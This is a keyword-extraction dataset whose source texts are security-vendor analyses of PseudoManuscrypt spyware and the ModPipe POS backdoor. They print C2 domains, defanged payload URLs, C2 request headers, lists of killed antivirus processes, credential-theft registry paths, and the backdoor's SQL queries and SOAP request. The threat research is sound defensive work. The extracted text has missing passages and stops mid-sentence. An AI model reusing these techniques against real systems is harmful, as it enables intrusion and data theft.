","{'phrases': ['The malware', 'PE', 'system info', 'the C2 server', 'commands', 'HTML', 'Download', 'Execute'], 'target': 'The malware; PE; system info; the C2 server; commands; HTML; Download; Execute.'}"
the attackers; the malware; the registry; access; the attackers; data; activities; the PseudoManuscrypt loader; part; Kaspersky; detection; compromise; IP; indicators; compromise; persistence; registry information; compromise.,"['1. The malware loader is distributed via pirated software installers from a malware-as-a-service platform. 2. The loader installs the main PseudoManuscrypt module, which adds itself as a service to persist on the system. 3. The module steals data like keystrokes, screenshots, microphone recordings, VPN credentials, etc. and sends it to a command server. 4. The command server can send back commands to perform additional malicious actions like disabling security software. ']","Extract the keywords: PseudoManuscrypt: a mass-scale spyware attack campaignKaspersky ICS CERT16.12.2021Version 1.0Technical details 3Identifying the loader. General information 3System infection 5Execution flow 6Variant 1. 6Variant 2. 7Searching for other components of the malware 8Main component of the malware 9Installation 9Destructive activity, version 1 10Destructive activity, version 2 12Sending data to the threat actor 14Victims 15About the attackers 18Conclusion 19Recommendations 20Indicators of compromise (IOC) 21PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN1 © 2021 AO KASPERSKY LABIn June 2021, Kaspersky ICS CERT experts identified malware whose loader has some similarities to the Manuscrypt malware, which is part of the Lazarus APT group’s arsenal. In 2020, the group used Manuscrypt in attacks on defense enterprises in different countries. These attacks are described in the report “Lazarus targets defense industry with ThreatNeedle”.Curiously, the data exfiltration channel of the malware uses an implementation of the KCP protocol that has previously been seen in the wild only as part of the APT41 group’s toolset.We dubbed the newly-identified malware PseudoManuscrypt.The PseudoManuscrypt loader makes its way onto user systems via a MaaS platform that distributes malware in pirated software installer archives. One specific case of the PseudoManuscrypt downloader’s distribution is its installation via the Glupteba botnet (whose main installer is also distributed via the pirated software installer distribution platform). This means that the malware distribution tactics used by the threat actor behind PseudoManuscrypt demonstrate no particular targeting.During the period from January 20 to November 10, 2021, Kaspersky products blocked PseudoManuscrypt on more than 35,000 computers in 195 countries of the world. Such a large number of attacked systems is not characteristic of the Lazarus group or APT attacks as a whole.Targets of PseudoManuscrypt attacks include a significant number of industrial and government organizations, including enterprises in the military-industrial complex and research laboratories.According to our telemetry, at least 7.2% of all computers attacked by the PseudoManuscrypt malware are part of industrial control systems (ICS) used by organizations in various industries, including Engineering, Building Automation, Energy, Manufacturing, Construction, Utilities, and Water Management.The main PseudoManuscrypt module has extensive and varied spying functionality. It includes stealing VPN connection data, logging keypresses, capturing screenshots and videos of the screen, recording sound with the microphone, stealing clipboard data and operating system event log data (which also makes stealing RDP authentication data possible), and much more. Essentially, the functionality of PseudoManuscrypt provides the attackers with virtually full control of the infected system.The full report is available on the Kaspersky Threat Intelligence portal. For more information please contact: ics-cert@kaspersky.com.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN2 © 2021 AO KASPERSKY LABTechnical detailsIdentifying the loader. General informationIn June 2021, Kaspersky ICS CERT experts uncovered a series of attacks targeting organizations across the globe, including government organizations and industrial enterprises.Initially, the malware was detected when it triggered antivirus solutions’ detection logic designed to detect the activity of the Lazarus APT. However, the overall picture of what was going on was too unusual to link the malicious activity to Lazarus. Specifically, the newly-identified malware had attacked at least 35,000 systems, which is uncharacteristic of a targeted attack.Research has revealed that the malware used in the attack loads its payload from the system registry and decrypts it. The payload’s location in the registry is unique for each infected system.The newly-identified malware loader has some similarities to the loader used by the Manuscrypt malware, which was used by the Lazarus group in 2020 to attack defense enterprises in different countries. (More detailed information on the attack can be found in the following report: “Lazarus Targets Defense Industry with ThreatNeedle”.)Both malicious programs load a payload from the system registry and decrypt it; in both cases, a special value in the CLSID format is used to determine the payload’s location in the registry.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN3 © 2021 AO KASPERSKY LABThe executable files of both malicious programs have virtually identical export tables:Comparison of the two malicious programs’ export tablesIn addition, the two malicious programs use similar executable file naming formats:Executable file namesTo emphasize the similarity of the newly-identified malware with Manuscrypt, while at the same time there was nothing else to link it to the Lazarus group, we decided to dub the Trojan PseudoManuscrypt.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN4 © 2021 AO KASPERSKY LABSystem infectionThe PseudoManuscrypt loader makes its way onto a user system via complicated chains of numerous other malicious files’ installations and the creation of many different processes. These chains are diverse, but they all begin with fake pirated software installer archives. Examples of archive names, which contain references to software of diverse types and purposes, are provided below:microsoft_office_365_july_keygen_by_keygensumo.zip modscan32_v8_a00_crack.zipIt is worth noting that these archives include fake installers of ICS-specific software, such as an application designed to create a MODBUS Master Device to receive data from a PLC, as well as more general-purpose software, which is nevertheless used on OT networks, such as a key generator for a SolarWinds tool for network engineers and systems administrators.Malicious web pages with installers in search-engine resultsPSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN5 © 2021 AO KASPERSKY LABResources used to distribute such installers can be found in top positions on search engine results pages. This indicates that the attackers are actively performing search-engine optimization for these resources.Execution flowThere are numerous possible variants of the execution flow of a sequence of different malicious programs leading to PseudoManuscrypt installation.In addition to the file analyzed in this paper, malware installers download and execute numerous other malicious programs, including spyware, backdoors, cryptocurrency miners, and adware.At each stage, we detected a large number of different droppers installed and modules downloaded, with the data theft functionality duplicated in different modules and with each module using its own command-and-control servers. This could indicate that the installers are offered by threat actors via a MaaS platform, possibly to many operators of different malicious campaigns, one of which is apparently the PseudoManuscrypt distribution campaign.The examples and graph fragments shown below illustrate the process chains leading to PseudoManuscrypt installation.Variant 1.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGNExecution flow, variant 16 © 2021 AO KASPERSKY LABIn the first variant:• the file key.bat is extracted from a fake installer, hxxps://google[.]diragame[.]com/userf/3002/gogonami.exe to download the main PseudoManuscrypt module – game.exe A MASS-SCALE SPYWARE ATTACK CAMPAIGN7 setup_install.exe). The Glupteba botnet has been known to researchers since 2011. It is a multi-module platform that has at different times downloaded adware, spyware, cryptocurrency miners, ransomware, spam modules, and other software traditionally associated with cybercriminal activities. The Glupteba platform is quite complicated and includes numerous different modules, such as exploits for various vulnerabilities, including exploits for routers, as well as rootkits. This is why rootkits, modules of the EternalBlue exploit, and other Glupteba modules are found on computers infected with PseudoManuscrypt via the Glupteba botnet.In another variant, which was described by BitDefender, a PseudoManuscrypt hxxps://jom[.]diregame[.]live/userf/2201/google-game.exe – according to our telemetry, at least on May 17, 2021. It is worth noting that at different times the link could be used to download malware from different families.Searching for other components of the malwareIn the course of searching for other components and versions of the malware, we were able to find over 100 different versions of the PseudoManuscrypt loader.According to our telemetry data, the mass distribution of the loader variant described in this paper began on May 10, 2021. However, its early variants were first identified on March 27, 2021, long before the attack started.Most of the files identified in March were ‘test builds’. The developer removed parts of the malicious program’s code one after another, apparently trying to find out which parts of the code trigger detection by antivirus solutions.Around the same time, the developer of the malware added dynamic import of the VirtualAlloc function. The function is used to allocate the memory needed to store the payload, which is loaded from the system registry.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN8 © 2021 AO KASPERSKY LABCuriously, some test builds of the loader contained comments in the executable file’s metadata fields. These comments were written in Chinese, which indicates that the malware developer may speak and write Chinese:Metadata in the executable file of the malwareMain component of the malwareFinally, we were able to identify the main module of PseudoManuscrypt, whose functionality includes installing the malware on the system and which contains a payload that gives us an idea of the types of data that are of interest to the threat actor.InstallationThe main module of the malware writes its code to a special registry value in the HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID key. The value name (CLSID value) is unique for each system, since it is generated using the registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid, which contains the system’s unique identifier. The malicious program’s code is stored in the system registry in encrypted form.Next, the malware extracts, to the %TEMP% folder or the %WinDir% folder (depending on the malware modification), the loader component, which is a DLL library and has a random file name in the [0-Z]{10}.tmp format, e.g., I59RFRLY9J.tmp.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN9 © 2021 AO KASPERSKY LABTo ensure that the payload is automatically executed after system startup, the Trojan creates a service, which has the loader component as its executable file. In the earliest malware samples found, the service created by the malware had the name AppService.Finally, the malware adds itself to the exclusions list of the Windows Defender antivirus solution by modifying the registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths.After this and, subsequently, after system restarts, the malware loader is executed. Using the value of the MachineGuid key to determine the location of the payload in the system registry, the loader loads, decrypts and executes the main component of the malware.Malware installation and executionDestructive activity, version 1The first variant of the PseudoManuscrypt main module to be identified includes several modules which have the common goal of stealing confidential information from the victim’s computer.1. Keylogger. Enables the malware to intercept the codes of keys pressedby the user on the keyboard. In addition to the key codes, the malware also records the name of the application window in which the data was entered, as well as the date and time when the information was entered. The threat actor borrowed this malicious component from otherPSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN10 © 2021 AO KASPERSKY LABmalware – Fabookie (Trojan.Win32.Fabookie), which has several modules for stealing authentication credentials for various services and websites.The authors of PseudoManuscrypt borrowed only the keylogger module from Fabookie, ignoring the modules designed for monetizing the attack in the quickest possible way, e.g., the module for stealing bank details from web pages. This offers an insight, albeit indirect, into the goals of the attack.2. Stealing data from the clipboard. Enables the attackers to interceptinformation copied by the user who works on an infected system.3. Stealing VPN connection data. The malware gets the contents of theWindows service files used to store data on VPN connections configured on the infected system:%UserProfile%\Application Data\Microsoft\Network\Connections\pbk\rasphone.pbk%ProgramData%\Microsoft\Network\Connections\pbk\rasphone.pbkThe Trojan attempts to extract the following data from the above files:• Address of the server to which to connect • Login and password, if they have been savedIt is worth emphasizing the fact that different components of the malware operate at the same time, providing the attackers with information from different sources. The attackers can combine that information and use all of it together.For example, the malware can get the VPN server address saved in connection parameters from the file rasphone.pbk. At the same time, the login and password required to connect can be intercepted by the keylogger module. If the user copies the connection parameters using the clipboard, the data will be intercepted by the relevant module of the malware.4. In addition to stealing VPN connection data, PseudoManuscryptfunctionality includes reading Windows Application, System, and Security event logs. It cannot be said for sure what the threat actor uses the data from operating system log files for, but, in theory, it can be used (in conjunction with other bits of the PseudoManuscrypt functionality) to steal authentication data for RDP. This looks quite reasonable since the malware has VPN credential-stealing capabilities.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN11 © 2021 AO KASPERSKY LAB5. Recording sound from microphones connected to an infected system. This feature is activated upon command from the malware command- and-control server.Destructive activity, version 2A second variant of the malware was discovered in July 2021. The threat actor had added extended spying functionality to that variant. The following modules were added:1. Capturing videos from the computer’s screen. This feature works inconjunction with other modules designed to intercept information, such as the keylogger and the module that steals data from the clipboard. Capturing screen videos enables the attackers to see which fields the user filled in and in which windows, as well as to follow the cursor’s movement and see on what areas the user clicked with the mouse.The module’s features that are worth mentioning include transparent window support (the aero peek technology) and video compression using the GNU GPL XviD 1.3.0 codec.2. Stealing authentication credentials from QQ and WeChat messagingapplications, which are popular in Asia.3. Collecting detailed system information: Windows version, build number, Service Pack, information on installed updates and the Windows edition, as well as the system’s role, e.g., whether the system performs the domain controller function.4. Collecting network connection data. The malware collects the names ofnetwork adapters, as well as connection type information (wired connection, Wi-Fi, fiber-optic connection, etc.).5. Disabling antivirus solutions. The malware attempts to gain theSeDebugPrivilege privileges and terminate the following processes of security solutions:sepWscSvc.exe SafeDogTray.exeSPIDer.exe f-secure.exe A MASS-SCALE SPYWARE ATTACK CAMPAIGN12 © 2021 AO KASPERSKY LABPSafeSysTray.exe ksafe.exertvscan.exe avp.exeThe malware also deletes registry keys for services belonging to security solutions whose names include the following substrings:Symantec NOD326. Collecting information on processes that accept network connections onTCP and UDP ports.7. One of the PseudoManuscrypt functions removes a file named“TestDown”, which is located in the same folder as the malicious program, then it clears the URL address htt[p]://sw.bos.baidu.com/sw-search- sp/software/df60f52e0e897/qqpcmgr_12.7.18996.207_1328_0.exe from the browser’s cache, downloads a file from the above URL address again to replace the deleted file “TestDown” and sets the newly created file’s attributes to “hidden” and “system”.8. Clearing Windows Application, Security, and System event logs.9. Writing data received from the malware command-and-control server tothe system file %System32%\drivers\etc\hosts, thereby enabling the attackers to redirect the user to malicious web resources or block access to selected sites.10. Exchanging text messages between the command-and-control server and the malware. The malware can open a window with a chat of sorts.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN13 © 2021 AO KASPERSKY LABThe service of the new PseudoManuscrypt version is installed in the system under the name ""iexplore"" and has the display name ""System Remote Data Simulation Layeerr"". The new malware version’s feature set also includes updating its executable file and removing itself from the proxy server. This could indicate that in some cases the attackers prepare a malware sample based on the specific network architecture used by the victim.In the new version of PseudoManuscrypt, the threat actor has also added the functionality of writing the codes of keys pressed by the user to a when connecting to the malware command-and-control server:HTTP/1.1Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Accept-Language: zh-cnAccept-Encoding: gzip, deflateUser-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)Connection: CloseCache-Control: no-cacheIt can be seen that the malware tells the server that the preferred language of the reply is Chinese.Sending data to the threat actorData collected by the malware is sent to the malware command-and-control server. In the course of our research, four such servers were identified: email.yg9[.]me, google.vrthcobj[.]com, toa.mygametoa[.]com and tob.mygametob[.]com.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN14 © 2021 AO KASPERSKY LABThe KCP protocol is used to connect to the server. According to its developers, the protocol is 10%-20% faster than TCP. The threat actor used a specific implementation of the KCP protocol.Curiously, according to a FireEye report, the KCP library used by PseudoManuscrypt malware had been used by the APT41 group in its attacks on industrial organizations from various industries, including engineering and defense industry enterprises. An analysis of malware collections that we were able to access yielded no instances of that library being used in malware other than the two cases mentioned above.Some of the malware samples identified also use a dedicated server, d.diragame.com, to send information on new system infections. We believe that this could be a MaaS platform’s statistics collection mechanism.VictimsDuring the period from January 20 to November 10, 2021, Kaspersky products blocked PseudoManuscrypt on more than 35,000 computers in 195 countries of the world.The graph below shows day-to-day changes in the number of computers on which PseudoManuscrypt was blocked. The two obvious surges on the graph – on March 27 and May 15 – correspond to the dates of release / distribution start of new PseudoManuscrypt versions.Number of systems on which PseudoManuscrypt was detected, by dayPSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN15 © 2021 AO KASPERSKY LABAt least 7.2% of all computers on which PseudoManuscrypt was blocked are ICS computers.Share of industrial systems in the overall set of computers attacked by PseudoManuscryptAs shown in the diagram below, nearly a third (29.4%) of non-ICS computers are located in Russia (10.1%), India (10%), and Brazil (9.3%).Percentage of non-ICS computers attacked by PseudoManuscrypt in different countriesThe distribution of non-ICS computers attacked by PseudoManuscrypt by country is similar to that for ICS computers. However, some countries, most ofPSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN16 © 2021 AO KASPERSKY LABwhich are located in Asia and the Middle East, show significantly higher percentages (by factors of 1.5 - 2) in the country ranking for ICS computers attacked than in the country ranking for non-ICS computers attacked.Percentage of ICS computers attacked by PseudoManuscrypt, by countryA significant proportion (31.5%) of industrial systems on which PseudoManuscrypt was blocked are apparently used for engineering, i.e., developing and launching the production of various industrial products, as well as for ICS development and integration – in different industries, including the defense and energy industries. This includes computers used for 3D modeling and physical simulations, as well as computers that have software for creating ‘digital twins’ installed on them.In addition, about 12.5% of computers on which PseudoManuscrypt was blocked belong to building automation systems (including video surveillance, access control systems, notification systems, etc.), 1.8% in the energy sector, 2.1% in various manufacturing facilities, 0.7% in construction (structural engineering), 0.1% in public utility computers and 0.1% on computers used in water treatment systems.About 51.2% of industrial computers on which PseudoManuscrypt was blocked are general-purpose ICS, which we cannot link to a specific industry with sufficient confidence.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN17 © 2021 AO KASPERSKY LABDistribution of industrial systems attacked by PseudoManuscrypt by industryIt was established in the course of the research that attack victims include, among others, enterprises connected with the military-industrial complex (such as research labs).Another curious fact is that, judging by information from public sources, some of the organizations attacked by PseudoManuscrypt have business and production ties with organizations that fell victim to the attack described in the following Kaspersky report: “Lazarus Targets Defense Industry with ThreatNeedle”.About the attackersA set of clues we have found may potentially point at the origin of the adversary or its ties:1. Some malware samples contain comments in Chinese in executable filemetadata.2. Data is sent to the attackers’ server using a library that has previously beenused only in malware of the Chinese group APT41.3. When connecting to the command-and-control server, the malware specifiesChinese as the preferred language.4. The malicious file contains code for connecting to Baidu, a popular Chinesecloud storage for files.5. The time of day at which new versions of the PseudoManuscrypt loader were uploaded by the developer falls within the 11 am to 7 pm interval in the GMT+8 time zone, in which several East Asian and Asia-Pacific countries are located.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN18 © 2021 AO KASPERSKY LABConclusionThreat actor malware testing activity timesDespite collecting and analyzing a large amount of data, it seems to us that many of our findings remain unexplained and do not fit any known schemes.Thus, we cannot say for certain whether the campaign is pursuing criminal mercenary goals or goals correlating with some governments’ interests. Nevertheless, the fact that attacked systems include computers of high-profile organizations in different countries makes us assess the threat level as high.The number of attacked systems is large and we see no clear focus on specific industrial organizations. However, the fact that a large number of ICS computers across the globe (many hundreds according to our telemetry alone – and in reality very likely to be much more) have been attacked in this campaign certainly makes it a threat that merits the very closest attention of specialists responsible for the security and safety of shop-floor systems and their continuous operation.The large number of engineering computers attacked, including systems used for 3D and physical modeling, the development and use of digital twins raises the issue of industrial espionage as one of the possible objectives of the campaign.We are not wrapping up our investigation as yet and will release information on new findings as they appear.If you have any questions or comments after reading this report or if you have any additional information that is relevant to the malicious campaign described in it, please do not hesitate to get in touch with us by sending an email to ics- cert@kaspersky.com.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN19 © 2021 AO KASPERSKY LABRecommendations1.Install endpoint protection software on all servers and workstations, be sure to enable centralized security policy management for it (with no administration rights assigned to the end-user), and ensure that the databases and program modules of the security solution are kept up-to-date.2. Check that all endpoint protection components are enabled on all systems and that a policy is in place which requires the administrator password to be entered in the event of attempts to disable protection.3. Check that Active Directory policies include restrictions on user attempts tolog in to systems. Users should only be allowed to log in to those systems which they need to access to perform their job responsibilities.4. Restrict network connections, including VPN, between systems on the OTnetwork; block connections on all those ports the use of which is not required for the continuity and safety of operations.5. Use smart cards (tokens) or one-time codes as the second authenticationfactor when establishing a VPN connection. In cases where this is applicable, use the Access Control List (ACL) technology to restrict the list of IP addresses from which a VPN connection can be initiated.6. Train employees of the enterprise in working with the internet, email andother communication channels securely and, specifically, explain the possible consequences of downloading and executing files from unverified sources.7. Use accounts with local administrator and domain administrator privilegesonly when this is necessary to perform the job responsibilities.8. Restrict the ability of programs to gain SeDebugPrivilege privileges (wherepossible).9. Enforce a password policy that has password complexity requirements andrequires passwords to be changed on a regular basis.10. Consider using Managed Detection and Response class services to gainquick access to high-level knowledge and expertise of security professionals.11. Use dedicated protection for shop-floor systems. Kaspersky IndustrialCyberSecurity protects industrial endpoints and enables OT network monitoring to identify and block malicious activity.PSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN20 © 2021 AO KASPERSKY LABIndicators of compromise (IOC)Checksums (MD5)In this section, we list MD5 hashes of those files which we believe were used in A MASS-SCALE SPYWARE ATTACK CAMPAIGN21 © 2021 AO KASPERSKY LABKaspersky Industrial Control Systems Cyber Emergency Response Team (Kaspersky ICS CERT) is a global project of Kaspersky aimed at coordinating the efforts of automation system vendors, industrial facility owners and operators, and IT security researchers to protect industrial enterprises from cyberattacks. Kaspersky ICS CERT devotes its efforts primarily to identifying potential and existing threats that target industrial automation systems and the industrial internet of things.Kaspersky ICS CERTics-cert@kaspersky.comPSEUDOMANUSCRYPT: A MASS-SCALE SPYWARE ATTACK CAMPAIGN22 © 2021 AO KASPERSKY LAB ","{'phrases': ['the malware loader', 'software', 'installers', 'the loader', 'the main PseudoManuscrypt module', 'a service', 'the system', 'the module', 'Data', 'keys', 'screenshots', 'VPN', 'command', 'addition', 'Security'], 'target': 'the malware loader; software; installers; the loader; the main PseudoManuscrypt module; a service; the system; the module; Data; keys; screenshots; VPN; command; addition; Security.'}"
the attackers; the RES 3700 POS software; the operator; persistence; the persistence module; The main module; communication; keylogging; the modules; data; network addresses; IP addresses; encryption keys; control; the modules; the C&C server; IP addresses; configuration information; the server.,"['1. The initial dropper is executed on the victim system, likely via Windows Command Shell. It installs the persistent loader. 2. The persistent loader unpacks and injects the main module into a system process like lsass.exe. 3. The main module sets up command and control communication and injects the networking module to send and receive data. 4. Additional modules like GetMicInfo and ModScan are downloaded from the C2 server. 5. GetMicInfo decrypts and extracts database passwords and configuration data from the registry. 6. ModScan can scan IP addresses and fingerprint the POS software environment. 7. Data is exfiltrated to the C2 server via the networking module. 8. The main module can also receive commands from the C2 server to further control the compromised machine. ']","Extract the keywords: 11/13/2020Hungry for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityHungry for data, ModPipe backdoor hits POS software used in hospitality sectorwelivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sectorNovember 12, 2020Backdoor authors show deep knowledge of the targeted POS software, decrypting database passwords from Windows registry valuesMartin Smolár 12 Nov 2020 - 11:30AMESET researchers have discovered ModPipe, a modular backdoor that gives its operators access to sensitive information stored in devices running ORACLE MICROS Restaurant Enterprise Series (RES) 3700 POS – a management software suite used by hundreds of thousands of bars, restaurants, hotels and other hospitality establishments worldwide.What makes the backdoor distinctive are its downloadable modules and their capabilities. One of them – named GetMicInfo – contains an algorithm designed to gather database passwords by decrypting them from Windows registry values. This shows that the backdoor’s authors have deep knowledge of the targeted software and opted for this sophisticated method instead of collecting the data via a simpler yet “louder” approach, such as keylogging.Exfiltrated credentials allow ModPipe’s operators access to database contents, including various definitions and configuration, status tables and information about POS transactions.However, based on the documentation of RES 3700 POS, the attackers should not be able to access some of the most sensitive information – such as credit card numbers and expiration dates – which is protected by encryption. The only customer data stored in the clear and thus available to the attackers should be cardholder names.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityThis would limit the amount of valuable information viable for further sale or misuse, making the full “business model” behind the operation unclear. One possible explanation is that another downloadable module exists that allows the malware operators to decrypt the more sensitive data in the user’s database.According to the documentation, to achieve this the attackers would have to reverse engineer the generation process of the “site-specific passphrase”, which is used to derive the encryption key for sensitive data. This process would then have to be implemented into the module and – due to use of the Windows Data Protection API (DPAPI) – executed directly on the victim’s machine. Another remaining unknown is ModPipe’s distribution method. The majority of the identified targets were from the United States, with indications that they were in the restaurant and hospitality sectors – the primary customers of RES 3700 POS.ModPipe architectureOur analysis shows that ModPipe uses modular architecture consisting of basic components and downloadable modules (for a better overview see Figure 1):1. initial dropper – contains both 32-bit and 64-bit binaries of the next stage – thepersistent loader – and installs the appropriate version to the compromised machine.2. persistent loader – unpacks and loads the next stage of the malware, namely themain module.3. main module – performs the main functionality of the malware. It creates a pipeused for communication with other malicious modules, un/installs these modules and serves as a dispatcher that handles communication between the modules and attacker’s C&C server.4. networking module – module used for communication with C&C. 5. downloadable modules – components adding specific functionality to thebackdoor, such as the ability to steal database passwords and configuration information, scan specific IP addresses or acquire a list of the running processes and their loaded modules.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 1. Overview of ModPipe backdoor architectureurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityDownloadable modulesProbably the most intriguing parts of ModPipe are its downloadable modules. We’ve been aware of their existence since the end of 2019, when we first found and analyzed its “basic” components.In April 2020, after a couple of months of hunting, we found three of these modules in the wild. The list of all downloadable modules we found and analyzed, and their IDs – represented by a 16-bit unsigned value – are available in Table 1. Our research also suggests that the operators use at least four other downloadable modules, whose functionality remains completely unknown to us for now.It’s worth mentioning that some of these modules can create a named pipe with a GUID- formatted name derived from the module’s ID. Other modules can use this pipe to send commands to the module that created it.Table 1. Downloadable modulesModule ID NameDescription0xA0C0GetMicInfo Steals database passwords, data and various settings0x2000ModScanPerforms scan on the specified IP addresses-0xA0000xA0400xA7400xA080ProcListGets list of the running processes and their loaded modulesunknownunknownunknownunknown----Downloadable module: GetMicInfoGetMicInfo is a downloadable component that targets data related to the MICROS POS including passwords tied to two database usernames predefined by the manufacturer: dba and micros (see Figure 2). This information is encrypted and stored in DataS5 (for dba) and DataS6 (for micros) registry values within one of the following registry keys:HKLM\Software\Micros\UserData or HKLM\Software\WOW6432Node\Micros\UserData if run in Windows 32-bit on Windows 64-bit (WOW64) subsystemurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 2. Hex-Rays decompiled code of the function stealing database passwordsThe GetMicInfo module can intercept and decrypt these database passwords, using a specifically designed algorithm. So as not to aid other malicious actors, we won’t be disclosing the inner workings of the algorithm. Since the decryption mechanism wasn’t publicly available, there are at least three possible scenarios of how the attackers could have created the algorithm:The most probable option is that the attackers acquired and reverse engineered the implementation of the ORACLE MICROS RES 3700 POS and the libraries responsible for encryption and decryption of the database passwords. The attackers could have gained the information describing the implementation of the encryption and decryption mechanism from a 2016 data breach described in a blogpost by Brian Krebs. The malware operators could have bought the code from an underground market.Our analysis shows that in cases where the GetMicInfo module decrypts the password for the dba username, it will also try to acquire the path to the SQL Anywhere API library from the environment variable “SQLANY_API_DLL” and load it if it’s available.If the environment variable does not exist, the module tries to load the library using its name dbcapi.dll. This library is a part of Sybase SQL Anywhere, which is used by RES 3700 POS.If one of these approaches is successful, GetMicInfo attempts to connect to the database using the following connection string:url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityDBN=micros;UID=dba;ENG=sql%PCNAME%;PWD=%decrypted_DataS5%%PCNAME% represents the computer name retrieved via the GetComputerName API and %decrypted_DataS5% stands for the decrypted dba user password.After establishing a connection, GetMicInfo tries to execute the following SQL queries and report the results to the main module, using a pipe message with ID 0x10000013 (see Table 3 for a full list of pipe messages and their IDs):123456789SELECT lan_node_seq,obj_num,name,lan_addr,ob_diskless,type,ip_addr,ip_netmask FROM micros.lan_node_defSELECT dvc_tbl_seq,obj_num,name,type,com_port_seq,com_port,baud_rate,num_- data_bits,num_stop_bits,parity_type,filename FROM micros.dev_defSELECT tmed_seq,obj_num,name,type,ca_driver,edc_driver FROM micros.tmed_defSELECT * FROM micros.caedc_driver_defSELECT * FROM micros.interface_defQueried data contain various MICROS RES 3700 POS system definitions and configurations (see Figure 3). Other information stolen by the module includes the version of the MICROS POS and information about specific registry keys most likely related to various credit card services configurations.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 3. Hex-Rays decompiled code of the function that steals database dataThe GetMicInfo module is injected into one of the processes specified by the C&C in the install command (0x0C). Based on our findings, it is typically associated with one of the following legitimate processes:MDSHTTPService.exe (MICROS MDS HTTP Service) CALSrv.exe (MICROS CAL Service – Client Application Loader server) explorer.exeWe can confirm that the GetMicInfo module can successfully obtain the database passwords from RES 3700 POS v4.7 and v5.4. For all the other versions, we were able neither to confirm nor deny the ability of the component to obtain the targeted libraries.Downloadable module: ModScan 2.20The main purpose of ModScan 2.20 is to collect additional information about the installed MICROS POS environment on the machines by scanning selected IP addresses. The ModScan 2.20 module is injected into one of the processes specified by the C&C via an InstallMod command (0x72). Based on our findings, it is typically associated with one of the following legitimate processes:MDSHTTPService.exe (MICROS MDS HTTP Service) CALSrv.exe (MICROS CAL Service – Client Application Loader server) services.exeDifferences between the injected processes misused by GetMicInfo and those targeted by ModScan 2.20 might be caused by the fact that GetMicInfo module is injected only into processes running under WOW64.The list of IP addresses intended for scanning and the special “ping” IP address are specified by the C&C in one of two ways. It is either:1. downloaded from the C&C along with the ModScan module, or 2. received during runtime, using the named pipe associated with the ModScan module.The ModScan module handles pipe commands listed in Table 2.Table 2. ModScan 2.20 module pipe commandsCommand nameCommand descriptionurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityCommand nameCommand descriptionexitstopscanprmExitTerminate scanning threadsStart scanning IPs specified in the command data to collect additional in- formation about the environmentSpecify special “ping” IP addressScanning procedure routine1. Before scanning, the module sends a special “ping” message containing a 32-bit valuegenerated by the GetTickCount Windows API function to TCP ports 50123 (used by MDS HTTP Service) and 2638 (used by SAP Sybase database server) of the “ping” IP address.2. The response from the “ping” IP address should contain the same 32-bit value rotatedright by one bit and XORed with the value 0x6CF6B8A8. If the response on at least one of the ports provides the appropriate value, the module will start the scan of the selected IP addresses. A decompilation of this ping function is shown in Figure 4.Figure 4. Hex-Rays decompiled code of the ModScan ping functionality3. When the ModScan module starts the scan, some of the following information may begathered, depending on the parameters received along with the scan command:Version of the Oracle MICROS RES 3700 POS, which is acquired by sending an HTTP Post message (see Figure 5) to the specified IP address on port 50123 used by the MDS HTTP Service. The sought-after information is stored between data xml tags (<data>%version%</data>) of the response from the service.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurity1234567891011121314151617181920POST /%s HTTP/1.1Accept: text/xmlUser-Agent: MDS POS ClientHost: %s:50123Content-Length: 459Connection: Keep-AliveCache-Control: no-cache<SOAP-ENV:Envelope xmlns:SOAP-ENV=""url lope/""><SOAP-ENV:Body xmlns:MCRS-ENV=""MCRS-URI""><MCRS-ENV:Service>MDSSYSUTILS</MCRS-ENV:Service><MCRS-ENV:Method>Reg_GetValue</MCRS-ENV:Method><MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey><MCRS-ENV:InputParameters><Key>SOFTWARE\MICROS</Key><KeyType>HKEY_LOCAL_MACHINE</KeyType><KeyName>Version</KeyName></MCRS-ENV:InputParameters></SOAP-ENV:Body></SOAP-ENV:Envelope>Figure 5. MDS HTTP Service requestName of the database, extracted by sending a specially crafted TCP packet (possibly 